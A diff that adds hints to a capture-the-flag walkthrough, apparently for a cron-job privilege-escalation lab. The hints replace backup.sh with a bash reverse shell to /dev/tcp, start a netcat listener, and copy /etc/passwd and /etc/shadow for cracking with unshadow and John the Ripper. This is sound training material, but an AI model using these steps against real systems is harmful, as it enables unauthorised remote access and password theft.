@@ -93,4 +93,25 @@ Question 1: How many cron jobs can you see on the target system?
 {{Hint: cat /etc/crontab}}
 
 Question 2: What is the content of the flag5.txt file? 
-{{
+{{Hint}}
+
+Replace the contents of backup.sh with the following:
+
+#!/bin/bash
+
+bash -i >& /dev/tcp/[your IP]/[listening port] 0>&1
+
+make sure to chmod +x backup.sh 
+
+In a separate terminal, set up a listenr:
+nc -lvnp [listening port]
+
+Wait for the shell. Flag5.txt will be under /home/ubuntu
+
+Question 3: What is Matt's password?
+{{Hint: save the contents of /etc/passwd and /etc/shadow to two separate files on your machine.
+
+Run: unshadow passwd.txt shadow.txt > unshadowed.txt
+
+Once this is done, run: john unshadowed.txt to crack the passwords.
+
